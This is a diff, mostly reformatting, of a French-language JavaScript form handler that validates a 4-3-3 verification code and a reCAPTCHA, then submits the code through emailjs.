@@ -43,7 +43,9 @@ const verificationForm = document.getElementById("verificationForm");
 console.log("Formulaire :", verificationForm);
 
 verificationForm.addEventListener("submit", function(e){
-console.log("Formulaire détecté");
+
+    console.log("Formulaire détecté");
+
     e.preventDefault();
 
 
@@ -52,25 +54,31 @@ console.log("Formulaire détecté");
         part2.value + "-" +
         part3.value;
 
-if(
-    part1.value.length !== 4 ||
-    part2.value.length !== 3 ||
-    part3.value.length !== 3
-){
-    result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
-    return;
 
-}
+    // Vérification du format 4-3-3
+    if(
+        part1.value.length !== 4 ||
+        part2.value.length !== 3 ||
+        part3.value.length !== 3
+    ){
+        result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
+        return;
+    }
+
+
     const captcha = grecaptcha.getResponse();
 
 
     if(captcha.length === 0){
 
-        alert("Veuillez confirmer le captcha.");
+        result.innerHTML = "Veuillez confirmer le captcha.";
         return;
 
     }
-console.log("Code envoyé :", code);
+
+
+    console.log("Code envoyé :", code);
+
 
     emailjs.send(
         "service_client",
@@ -83,20 +91,17 @@ console.log("Code envoyé :", code);
         }
     )
 
-   .then(function(){
+    .then(function(){
 
-    result.innerHTML = "Votre demande a été envoyée.";
+        result.innerHTML = "Votre demande a été envoyée.";
 
-    // Effacer les champs du code
-    part1.value = "";
-    part2.value = "";
-    part3.value = "";
+        part1.value = "";
+        part2.value = "";
+        part3.value = "";
 
-    // Réinitialiser le captcha
-    grecaptcha.reset();
+        grecaptcha.reset();
 
-    // Remettre le curseur sur le premier champ
-    part1.focus();
+        part1.focus();
 
     })
 
@@ -110,3 +115,4 @@ console.log("Code envoyé :", code);
 
 
 });
+
